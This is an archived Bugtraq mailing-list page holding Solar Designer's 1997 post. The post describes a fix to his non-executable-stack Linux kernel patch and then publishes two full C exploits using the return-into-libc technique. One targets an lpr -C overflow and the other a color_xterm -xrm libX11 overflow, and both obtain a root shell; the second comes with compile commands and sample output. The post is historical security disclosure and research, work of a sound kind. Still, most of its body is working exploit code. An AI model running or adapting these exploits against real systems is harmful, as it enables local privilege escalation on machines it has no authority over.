@@ -1,0 +1,700 @@
+<!-- MHonArc v2.6.19 -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"
+                      "http://www.w3.org/TR/REC-html40/loose.dtd">
+<HTML>
+<HEAD>
+<link rel="alternate" type="application/rss+xml" title="RSS" href="http://seclists.org/rss/bugtraq.rss">
+<title>Bugtraq: Getting around non-executable stack (and fix)</title>
+<meta property="og:image" content="http://seclists.org/images/bugtraq-img.png" />
+<link rel="image_src" href="http://seclists.org/images/bugtraq-img.png" />
+<meta name="Subject" content="Getting around non-executable stack (and fix)"/>
+<meta name="Author" content="Solar Designer"/>
+<link REL="SHORTCUT ICON" HREF="/shared/images/tiny-eyeicon.png" TYPE="image/png">
+<META NAME="ROBOTS" CONTENT="NOARCHIVE">
+<meta name="theme-color" content="#2A0D45">
+<link rel="stylesheet" href="/shared/css/insecdb.css" type="text/css">
+<!--Google Analytics Code-->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-11009417-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<!--END Google Analytics Code-->
+
+<!--Google Custom Site Search boilerplate Javascript-->
+<script type="text/javascript">
+  (function() {
+    var cx = 'partner-pub-0078565546631069:bx60rb-fytx';
+    var gcse = document.createElement('script'); gcse.type = 'text/javascript'; gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+        '//www.google.com/cse/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+<!--End Google Custom Site Search boilerplate Javascript-->
+
+</HEAD>
+<BODY BGCOLOR="#2A0D45" TEXT="#000000">
+
+<TABLE CELLPADDING="0" WIDTH="100%" CELLSPACING="0">
+<TR><TD ALIGN="left"><A HREF="/"><IMG BORDER=0 ALT="Home page logo"
+SRC="/images/sitelogo.png" HEIGHT=90 WIDTH=168></A></TD>
+<TD VALIGN="bottom" ALIGN="right">
+  <!-- Begin TopBanner Code -->
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- TopBanner728x90 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-0078565546631069"
+     data-ad-slot="4776164010"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<!-- AdSpeed.com Serving Code 7.9.6 for [Zone] TopBanner [Any Dimension] -->
+<!-- <script type="text/javascript" src="//g.adspeed.net/ad.php?do=js&amp;zid=14678&amp;wd=-1&amp;ht=-1&amp;target=_blank"></script> -->
+<!-- AdSpeed.com End -->
+<!-- End Banner Code -->
+
+</TD></TR></TABLE>
+<TABLE WIDTH="100%" CELLPADDING="0" CELLSPACING="0"><TR>
+<TD ALIGN="left" WIDTH="130" VALIGN="top" class="sidebar">
+
+<!-- SECWIKI PORTAL INSERT -->
+
+<ul>
+<li><a href="https://nmap.org/">Nmap Security Scanner</a>
+<ul>
+<li><a href="https://nmap.org/">Intro</a></li>
+<li><a href="https://nmap.org/book/man.html">Ref Guide</a></li>
+<li><a href="https://nmap.org/book/install.html">Install Guide</a></li>
+<li><a href="https://nmap.org/download.html">Download</a></li>
+<li><a href="https://nmap.org/changelog.html">Changelog</a></li>
+<li><a href="https://nmap.org/book/">Book</a></li>
+<li><a href="https://nmap.org/docs.html">Docs</a></li>
+</ul>
+<li><a href="http://seclists.org/">Security Lists</a>
+<ul>
+<li><a href="http://seclists.org/nmap-announce/">Nmap Announce</a></li>
+<li><a href="http://seclists.org/nmap-dev/">Nmap Dev</a></li>
+<li><a href="http://seclists.org/bugtraq/">Bugtraq</a></li>
+<li><a href="http://seclists.org/fulldisclosure/">Full Disclosure</a></li>
+<li><a href="http://seclists.org/pen-test/">Pen Test</a></li>
+<li><a href="http://seclists.org/basics/">Basics</a></li>
+<li><a href="http://seclists.org/">More</a></li>
+</ul>
+<li><a href="http://sectools.org">Security Tools</a>
+<ul>
+<li><a href="http://sectools.org/tag/pass-audit/">Password audit</a></li>
+<li><a href="http://sectools.org/tag/sniffers/">Sniffers</a></li>
+<li><a href="http://sectools.org/tag/vuln-scanners/">Vuln scanners</a></li>
+<li><a href="http://sectools.org/tag/web-scanners/">Web scanners</a></li>
+<li><a href="http://sectools.org/tag/wireless/">Wireless</a></li>
+<li><a href="http://sectools.org/tag/sploits/">Exploitation</a></li>
+<li><a href="http://sectools.org/tag/packet-crafters/">Packet crafters</a></li>
+<li><a href="http://sectools.org/">More</a></li>
+</ul>
+<li><a href="http://insecure.org/">Site News</a></li>
+<li><a href="http://insecure.org/advertising.html">Advertising</a></li>
+<li><a href="http://insecure.org/fyodor/">About/Contact</a></li>
+<li>
+<!-- SiteSearch Google -->
+<form action="https://nmap.org/search.html" id="cse-search-box-sidebar">
+  <div>
+    <input type="hidden" name="cx" value="partner-pub-0078565546631069:bx60rb-fytx">
+    <input type="hidden" name="cof" value="FORID:9">
+    <input type="hidden" name="ie" value="ISO-8859-1">
+    <input type="text" name="q" size="16">
+    <input type="submit" name="sa" value="Site Search">
+  </div>
+</form>
+<!-- End SiteSearch Google -->
+</li>
+<!-- These can come back if I ever update them ...
+<li><a href="http://insecure.org/links.html">Exceptional Links</a></li>
+<li><a href="http://insecure.org/reading.html">Good Reading</a></li>
+<li><a href="http://insecure.org/sploits.html">Exploit World</a></li>
+-->
+<li><a href="http://insecure.org/advertising.html">Sponsors:</a>
+  <br><br>
+  
+<!-- Begin Google Sidebar Banner Code -->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- SidebarSkyScraper -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:120px;height:600px"
+     data-ad-client="ca-pub-0078565546631069"
+     data-ad-slot="9829251079"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<!-- End Google Sidebar Banner Code -->
+
+</li>
+</ul>
+
+</TD>
+<TD BGCOLOR="#FFFFFF" VALIGN="top" ALIGN="left"><IMG
+SRC="/shared/images/topleftcurve.gif" alt="/"><TABLE CELLPADDING="4" WIDTH="100%" style="table-layout: fixed;"><TR><TD BGCOLOR="#FFFFFF">
+
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<p>
+<A HREF="/bugtraq/"><img src="/images/bugtraq-logo.png" border="0" width="80" style="vertical-align: middle" alt="bugtraq logo"></A>
+<FONT SIZE="+1"><a href="http://seclists.org/bugtraq/">Bugtraq</a>
+mailing list archives</FONT><br>
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<!-- Google Custom SiteSearch -->
+<form action="http://insecure.org/search.html" id="top-search-box">
+<a href="67"><img src="/images/left-icon-16x16.png" border=0 width=16 height=16></a>&nbsp;&nbsp;<a href="date.html#63">By Date</a>&nbsp;&nbsp;<a href="68"><img src="/images/right-icon-16x16.png" border=0 width=16 height=16></a>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="71"><img src="/images/left-icon-16x16.png" border=0 width=16 height=16></a>&nbsp;&nbsp;<a href="index.html#63">By Thread</a>&nbsp;&nbsp;<a href="55"><img src="/images/right-icon-16x16.png" border=0 width=16 height=16></a>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    <input type="hidden" name="cx" value="partner-pub-0078565546631069:bx60rb-fytx" />
+    <input type="hidden" name="cof" value="FORID:9" />
+    <input type="hidden" name="ie" value="ISO-8859-1" />
+    <input type="text" name="q" size="24" />
+    <input type="submit" name="sa" value="Search" />
+</form>
+<script type="text/javascript" src="http://www.google.com/coop/cse/brand?form=top-search-box&amp;lang=en"></script>
+<!-- End Google Custom SiteSearch -->
+</p>
+
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<font size="+2"><b>Getting around non-executable stack (and fix)</b></font>
+<hr>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+
+
+<em>From</em>: solar () FALSE COM (Solar Designer)<br>
+
+<em>Date</em>: Sun, 10 Aug 1997 17:29:46 -0300<br>
+
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<hr>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<pre style="margin: 0em;">
+
+Hello!
+
+I finally decided to post a return-into-libc overflow exploit. This method
+has been discussed on linux-kernel list a few months ago (special thanks to
+Pavel Machek), but there was still no exploit. I&apos;ll start by speaking about
+the fix, you can find the exploits (local only) below.
+
+[ I recommend that you read the entire message even if you aren&apos;t running
+Linux since a lot of the things described here are applicable to other
+systems as well (perhaps someone will finally exploit those overflows in
+Digital UNIX discussed here last year?). Also, this method might sometimes
+be better than usual one (with shellcode) even if the stack is executable. ]
+
+You can find the fixed version of my non-executable stack Linux kernel patch
+at <a  rel="nofollow" href="http://www.false.com/security/linux-stack/">http://www.false.com/security/linux-stack/</a>.
+
+The problem is fixed by changing the address shared libraries are mmap()ed
+at in such a way so it always contains a zero byte. With most vulnerabilities
+the overflow is done with an ASCIIZ string, so this prevents the attacker
+from passing parameters to the function, and from filling the buffer with
+a pattern (requires to know the exact offset of the return address). I admit
+someone might still find a libc function with no parameters (this also has
+to be a single function, you can&apos;t call several of them in a row) that does
+enough harm, and find the exact offset of the return address. However, this
+gets quite complicated, especially for remote exploits, and especially for
+those where you have to guess from the first try (and you also need to guess
+the address in libc). So, like before, fix known vulnerabilities, and use
+the patch to add an extra layer of security against those yet unknown.
+
+I also fixed a bug with the binary header flag which allowed local users to
+bypass the patch. Thanks to retch for reporting.
+
+And one more good thing: I added a symlink-in-/tmp fix, originally by Andrew
+Tridgell. I changed it to prevent from using hard links too, by simply not
+allowing non-root users to create hard links to files they don&apos;t own, in +t
+directories. This seems to be the desired behavior anyway, since otherwise
+users couldn&apos;t remove such links they just created. I also added exploit
+attempt logging, this code is shared with the non-executable stack stuff,
+and was the reason to make it a single patch instead of two separate ones.
+You can enable them separately anyway.
+
+And now here goes the exploit for the well-known old overflow in lpr. This
+one is simple, so it looks like a good starting point. Note: it doesn&apos;t
+contain any assembly code, there&apos;s only a NOP opcode, but this one will
+most likely not be used, it&apos;s for the case when system() is occasionally
+at a 256 byte boundary. The exploit also doesn&apos;t have any fixed addresses.
+Be sure to read comments in the exploit before you look at the next one.
+
+</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">-- lpr.c --&lt;
+</pre></blockquote><pre style="margin: 0em;">
+
+/*
+ * /usr/bin/lpr buffer overflow exploit for Linux with non-executable stack
+ * Copyright (c) 1997 by Solar Designer
+ */
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;setjmp.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/wait.h&gt;
+
+#define SIZE            1200    /* Amount of data to overflow with */
+#define ALIGNMENT       11      /* 0, 8, 1..3, 9..11 */
+
+#define ADDR_MASK       0xFF000000
+
+char buf[SIZE];
+int *ptr;
+
+int pid, pc, shell, step;
+int started = 0;
+jmp_buf env;
+
+void handler() {
+  started++;
+}
+
+/* SIGSEGV handler, to search in libc */
+void fault() {
+  if (step &lt; 0) {
+/* Change the search direction */
+    longjmp(env, 1);
+  } else {
+/* The search failed in both directions */
+    puts(&quot;\&quot;/bin/sh\&quot; not found, bad luck&quot;);
+    exit(1);
+  }
+}
+
+void error(char *fn) {
+  perror(fn);
+  if (pid &gt; 0) kill(pid, SIGKILL);
+  exit(1);
+}
+
+void main() {
+  signal(SIGUSR1, handler);
+
+/* Create a child process to trace */
+  if ((pid = fork()) &lt; 0) error(&quot;fork&quot;);
+
+  if (!pid) {
+/* Send the parent a signal, so it starts tracing */
+    kill(getppid(), SIGUSR1);
+/* A loop since the parent may not start tracing immediately */
+    while (1) system(&quot;&quot;);
+  }
+
+/* Wait until the child tells us the next library call will be system() */
+  while (!started);
+
+  if (ptrace(PTRACE_ATTACH, pid, 0, 0)) error(&quot;PTRACE_ATTACH&quot;);
+
+/* Single step the child until it gets out of system() */
+  do {
+    waitpid(pid, NULL, WUNTRACED);
+    pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
+    if (pc == -1) error(&quot;PTRACE_PEEKUSR&quot;);
+    if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error(&quot;PTRACE_SINGLESTEP&quot;);
+  } while ((pc &amp; ADDR_MASK) != ((int)main &amp; ADDR_MASK));
+
+/* Single step the child until it calls system() again */
+  do {
+    waitpid(pid, NULL, WUNTRACED);
+    pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
+    if (pc == -1) error(&quot;PTRACE_PEEKUSR&quot;);
+    if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error(&quot;PTRACE_SINGLESTEP&quot;);
+  } while ((pc &amp; ADDR_MASK) == ((int)main &amp; ADDR_MASK));
+
+/* Kill the child, we don&apos;t need it any more */
+  if (ptrace(PTRACE_KILL, pid, 0, 0)) error(&quot;PTRACE_KILL&quot;);
+  pid = 0;
+
+  printf(&quot;system() found at: %08x\n&quot;, pc);
+
+/* Let&apos;s hope there&apos;s an extra NOP if system() is 256 byte aligned */
+  if (!(pc &amp; 0xFF))
+  if (*(unsigned char *)--pc != 0x90) pc = 0;
+
+/* There&apos;s no easy workaround for these (except for using another function) */
+  if (!(pc &amp; 0xFF00) || !(pc &amp; 0xFF0000) || !(pc &amp; 0xFF000000)) {
+    puts(&quot;Zero bytes in address, bad luck&quot;);
+    exit(1);
+  }
+
+/*
+ * Search for a &quot;/bin/sh&quot; in libc until we find a copy with no zero bytes
+ * in its address. To avoid specifying the actual address that libc is
+ * mmap()ed to we search from the address of system() in both directions
+ * until a SIGSEGV is generated.
+ */
+  if (setjmp(env)) step = 1; else step = -1;
+  shell = pc;
+  signal(SIGSEGV, fault);
+  do
+    while (memcmp((void *)shell, &quot;/bin/sh&quot;, 8)) shell += step;
+  while (!(shell &amp; 0xFF) || !(shell &amp; 0xFF00) || !(shell &amp; 0xFF0000));
+  signal(SIGSEGV, SIG_DFL);
+
+  printf(&quot;\&quot;/bin/sh\&quot; found at: %08x\n&quot;, shell);
+
+/*
+ * When returning into system() the stack should look like:
+ *                              pointer to &quot;/bin/sh&quot;
+ *                              return address placeholder
+ * stack pointer -&gt;             pointer to system()
+ *
+ * The buffer could be filled with this 12 byte pattern, but then we would
+ * need to try up to 12 values for the alignment. That&apos;s why a 16 byte pattern
+ * is used instead:
+ *                              pointer to &quot;/bin/sh&quot;
+ *                              pointer to &quot;/bin/sh&quot;
+ * stack pointer (case 1) -&gt;    pointer to system()
+ * stack pointer (case 2) -&gt;    pointer to system()
+ *
+ * Any of the two stack pointer values will do, and only up to 8 values for
+ * the alignment need to be tried.
+ */
+  memset(buf, &apos;x&apos;, ALIGNMENT);
+  ptr = (int *)(buf + ALIGNMENT);
+  while ((char *)ptr &lt; buf + SIZE - 4*sizeof(int)) {
+    *ptr++ = pc; *ptr++ = pc;
+    *ptr++ = shell; *ptr++ = shell;
+  }
+  buf[SIZE - 1] = 0;
+
+  execl(&quot;/usr/bin/lpr&quot;, &quot;lpr&quot;, &quot;-C&quot;, buf, NULL);
+  error(&quot;execl&quot;);
+}
+
+</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">-- lpr.c --&lt;
+</pre></blockquote><pre style="margin: 0em;">
+
+The exploit above will crash after you exit the shell. This can be fixed by
+using a 12 byte pattern (like described in the comment), and setting the
+return address to point to exit() (we would need to find it first). This
+would however increase the number of possible alignment values to try from
+8 to 12, so I don&apos;t do it.
+
+Now, a more complicated exploit, for the -xrm libX11 overflow. It has been
+tested with color_xterm from Slackware 3.1. Will also work on other xterms
+(tested with xterm and nxterm from RedHat 4.2), but providing a user shell
+(not root), since these temporarily give up their privileges, and an extra
+setuid() call would be required.
+
+Actually, using this method it is possible to call two functions in a row
+if the first one has exactly one parameter. The stack should look like this:
+
+                                pointer to &quot;/bin/sh&quot;
+                                pointer to the UID (usually to 0)
+                                pointer to system()
+ stack pointer -&gt;               pointer to setuid()
+
+This will require up to 16 values for the alignment. In this case, setuid()
+will return into system(), and while system() is running the pointer to UID
+will be at the place where system()&apos;s return address should normally be, so
+(again) the thing will crash after you exit the shell (but no solution this
+time; who cares anyway?). I leave this setuid() stuff as an exercise for the
+reader.
+
+Another thing specific to this exploit is that GetDatabase() in libX11 uses
+its parameter right before returning, so if we overwrite the return address
+and a few bytes after it (like normal pattern filling would do), the exploit
+wouldn&apos;t work. That was the reason the -xrm exploits posted were not stable,
+and required to adjust the size exactly. With returning into libc, this was
+not possible at all, since parameters to libc function should be right after
+the return address. That&apos;s why I do a trick similar to my SuperProbe exploit:
+overwrite a pointer to a structure that has a function pointer in it (their
+function also has exactly one parameter, I was extremely lucky here again).
+
+This trick requires three separate buffers filled with different patterns.
+The first buffer is what I overflow with, while the two others are put onto
+the stack separately (to make them larger). Again, there&apos;s no correct return
+address from system(), and a pointer to some place on the stack is there.
+This makes it behave quite funny when you exit the shell: an exploit attempt
+is logged (when running my patch), since system() returns onto the stack. ;^)
+You can just kill the vulnerable program you&apos;re running from instead of
+exiting the shell if this is undesired.
+
+Note that you have to link the exploit with the same shared libraries that
+the vulnerable program. Also, it might be required to add 4 to ALIGNMENT2 if
+the exploit doesn&apos;t work, even if it worked when running as another user...
+
+</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">-- cx.c --&lt;
+</pre></blockquote><pre style="margin: 0em;">
+
+/*
+ * color_xterm buffer overflow exploit for Linux with non-executable stack
+ * Copyright (c) 1997 by Solar Designer
+ *
+ * Compile:
+ * gcc cx.c -o cx -L/usr/X11/lib \
+ * `ldd /usr/X11/bin/color_xterm | sed -e s/^.lib/-l/ -e s/\\\.so.\\\+//`
+ *
+ * Run:
+ * $ ./cx
+ * system() found at: 401553b0
+ * &quot;/bin/sh&quot; found at: 401bfa3d
+ * bash# exit
+ * Segmentation fault
+ */
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;setjmp.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/wait.h&gt;
+
+#define SIZE1           1200    /* Amount of data to overflow with */
+#define ALIGNMENT1      0       /* 0..3 */
+#define OFFSET          22000   /* Structure array offset */
+#define SIZE2           16000   /* Structure array size */
+#define ALIGNMENT2      5       /* 0, 4, 1..3, 5..7 */
+#define SIZE3           SIZE2
+#define ALIGNMENT3      (ALIGNMENT2 &amp; 3)
+
+#define ADDR_MASK       0xFF000000
+
+char buf1[SIZE1], buf2[SIZE2 + SIZE3], *buf3 = &amp;buf2[SIZE2];
+int *ptr;
+
+int pid, pc, shell, step;
+int started = 0;
+jmp_buf env;
+
+void handler() {
+  started++;
+}
+
+/* SIGSEGV handler, to search in libc */
+void fault() {
+  if (step &lt; 0) {
+/* Change the search direction */
+    longjmp(env, 1);
+  } else {
+/* The search failed in both directions */
+    puts(&quot;\&quot;/bin/sh\&quot; not found, bad luck&quot;);
+    exit(1);
+  }
+}
+
+void error(char *fn) {
+  perror(fn);
+  if (pid &gt; 0) kill(pid, SIGKILL);
+  exit(1);
+}
+
+int nz(int value) {
+  if (!(value &amp; 0xFF)) value |= 8;
+  if (!(value &amp; 0xFF00)) value |= 0x100;
+
+  return value;
+}
+
+void main() {
+/*
+ * A portable way to get the stack pointer value; why do other exploits use
+ * an assembly instruction here?!
+ */
+  int sp = (int)&amp;sp;
+
+  signal(SIGUSR1, handler);
+
+/* Create a child process to trace */
+  if ((pid = fork()) &lt; 0) error(&quot;fork&quot;);
+
+  if (!pid) {
+/* Send the parent a signal, so it starts tracing */
+    kill(getppid(), SIGUSR1);
+/* A loop since the parent may not start tracing immediately */
+    while (1) system(&quot;&quot;);
+  }
+
+/* Wait until the child tells us the next library call will be system() */
+  while (!started);
+
+  if (ptrace(PTRACE_ATTACH, pid, 0, 0)) error(&quot;PTRACE_ATTACH&quot;);
+
+/* Single step the child until it gets out of system() */
+  do {
+    waitpid(pid, NULL, WUNTRACED);
+    pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
+    if (pc == -1) error(&quot;PTRACE_PEEKUSR&quot;);
+    if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error(&quot;PTRACE_SINGLESTEP&quot;);
+  } while ((pc &amp; ADDR_MASK) != ((int)main &amp; ADDR_MASK));
+
+/* Single step the child until it calls system() again */
+  do {
+    waitpid(pid, NULL, WUNTRACED);
+    pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
+    if (pc == -1) error(&quot;PTRACE_PEEKUSR&quot;);
+    if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error(&quot;PTRACE_SINGLESTEP&quot;);
+  } while ((pc &amp; ADDR_MASK) == ((int)main &amp; ADDR_MASK));
+
+/* Kill the child, we don&apos;t need it any more */
+  if (ptrace(PTRACE_KILL, pid, 0, 0)) error(&quot;PTRACE_KILL&quot;);
+  pid = 0;
+
+  printf(&quot;system() found at: %08x\n&quot;, pc);
+
+/* Let&apos;s hope there&apos;s an extra NOP if system() is 256 byte aligned */
+  if (!(pc &amp; 0xFF))
+  if (*(unsigned char *)--pc != 0x90) pc = 0;
+
+/* There&apos;s no easy workaround for these (except for using another function) */
+  if (!(pc &amp; 0xFF00) || !(pc &amp; 0xFF0000) || !(pc &amp; 0xFF000000)) {
+    puts(&quot;Zero bytes in address, bad luck&quot;);
+    exit(1);
+  }
+
+/*
+ * Search for a &quot;/bin/sh&quot; in libc until we find a copy with no zero bytes
+ * in its address. To avoid specifying the actual address that libc is
+ * mmap()ed to we search from the address of system() in both directions
+ * until a SIGSEGV is generated.
+ */
+  if (setjmp(env)) step = 1; else step = -1;
+  shell = pc;
+  signal(SIGSEGV, fault);
+  do
+    while (memcmp((void *)shell, &quot;/bin/sh&quot;, 8)) shell += step;
+  while (!(shell &amp; 0xFF) || !(shell &amp; 0xFF00) || !(shell &amp; 0xFF0000));
+  signal(SIGSEGV, SIG_DFL);
+
+  printf(&quot;\&quot;/bin/sh\&quot; found at: %08x\n&quot;, shell);
+
+/* buf1 (which we overflow with) is filled with pointers to buf2 */
+  memset(buf1, &apos;x&apos;, ALIGNMENT1);
+  ptr = (int *)(buf1 + ALIGNMENT1);
+  while ((char *)ptr &lt; buf1 + SIZE1 - sizeof(int))
+    *ptr++ = nz(sp - OFFSET);           /* db */
+  buf1[SIZE1 - 1] = 0;
+
+/* buf2 is filled with pointers to &quot;/bin/sh&quot; and to buf3 */
+  memset(buf2, &apos;x&apos;, SIZE2 + SIZE3);
+  ptr = (int *)(buf2 + ALIGNMENT2);
+  while ((char *)ptr &lt; buf2 + SIZE2) {
+    *ptr++ = shell;                     /* db-&gt;mbstate */
+    *ptr++ = nz(sp - OFFSET + SIZE2);   /* db-&gt;methods */
+  }
+
+/* buf3 is filled with pointers to system() */
+  ptr = (int *)(buf3 + ALIGNMENT3);
+  while ((char *)ptr &lt; buf3 + SIZE3 - sizeof(int))
+    *ptr++ = pc;                        /* db-&gt;methods-&gt;mbfinish */
+  buf3[SIZE3 - 1] = 0;
+
+/* Put buf2 and buf3 on the stack */
+  setenv(&quot;BUFFER&quot;, buf2, 1);
+
+/* GetDatabase() in libX11 will do (*db-&gt;methods-&gt;mbfinish)(db-&gt;mbstate) */
+  execl(&quot;/usr/X11/bin/color_xterm&quot;, &quot;color_xterm&quot;, &quot;-xrm&quot;, buf1, NULL);
+  error(&quot;execl&quot;);
+}
+
+</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">-- cx.c --&lt;
+</pre></blockquote><pre style="margin: 0em;">
+
+That&apos;s all for now.
+I hope I managed to prove that exploiting buffer overflows should be an art.
+
+Signed,
+Solar Designer
+
+
+</pre>
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<hr>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<p>
+<a href="67"><img src="/images/left-icon-16x16.png" border=0 width=16 height=16></a>&nbsp;&nbsp;<a href="date.html#63">By Date</a>&nbsp;&nbsp;<a href="68"><img src="/images/right-icon-16x16.png" border=0 width=16 height=16></a>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="71"><img src="/images/left-icon-16x16.png" border=0 width=16 height=16></a>&nbsp;&nbsp;<a href="index.html#63">By Thread</a>&nbsp;&nbsp;<a href="55"><img src="/images/right-icon-16x16.png" border=0 width=16 height=16></a>
+</p>
+<font size="+1"><b>Current thread:</b></font>
+<ul style="margin-top: 0em">
+<li><a name="54" href="54">popper and qpopper let you read email from other pop clients</a> <em>dynamo () IME NET (Aug 07)</em>
+<ul>
+<li><a name="62" href="62">Re: popper and qpopper let you read email from other pop clients</a> <em>Ian R. Justman (Aug 08)</em>
+<ul>
+<li><a name="72" href="72">solaris ^[[1J reboot</a> <em>Tobias Oetiker (Aug 10)</em>
+<ul>
+<li><a name="74" href="74">Re: solaris ^[[1J reboot</a> <em>Scott Moseman (Aug 11)</em>
+</li>
+</ul>
+</li>
+<li><a name="70" href="70">Re: popper and qpopper let you read email from other pop clients</a> <em>Marc Slemko (Aug 10)</em>
+</li>
+<li><a name="73" href="73">dgux in.fingerd vulnerability</a> <em>George Imburgia (Aug 11)</em>
+</li>
+<li><a name="71" href="71">procfs patch (fwd)</a> <em>Alex (Aug 11)</em>
+</li>
+</ul>
+</li>
+<li><strong>Getting around non-executable stack (and fix)</strong> <em>Solar Designer (Aug 10)</em>
+</li>
+</ul>
+</li>
+</ul>
+
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</TD></TR>
+</TABLE>
+</TD></TR>
+<TR><TD></TD><TD ALIGN="center">
+<FONT COLOR="#FFFFFF">
+[ <A HREF="https://nmap.org"><FONT COLOR="#FFFFFF">Nmap</FONT></A> |
+  <A HREF="http://sectools.org"><FONT COLOR="#FFFFFF">Sec Tools</FONT></A> |
+  <A HREF="http://seclists.org/"><FONT COLOR="#FFFFFF">Mailing Lists</FONT></A> |
+  <A HREF="http://insecure.org/"><FONT COLOR="#FFFFFF">Site News</FONT></A> |
+  <A HREF="http://insecure.org/fyodor/"><FONT COLOR="#FFFFFF">About/Contact</FONT></A> |
+  <A HREF="http://insecure.org/advertising.html"><FONT COLOR="#FFFFFF">Advertising</FONT></A> |
+  <A HREF="http://insecure.org/privacy.html"><FONT COLOR="#FFFFFF">Privacy</FONT></A> ]<BR>
+</FONT>
+
+<!-- SiteSearch Google -->
+<div class="gcse-searchbox-only" data-resultsUrl="https://nmap.org/search.html"></div>
+<!-- End SiteSearch Google -->
+
+<!-- Bottom Banner -->
+<!-- Adsense -->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- PageBottom728x90 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-0078565546631069"
+     data-ad-slot="2743510915"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<!-- End Bottom Banner -->
+</TD></TR>
+</TABLE>
+</BODY>
+</HTML>
+
+
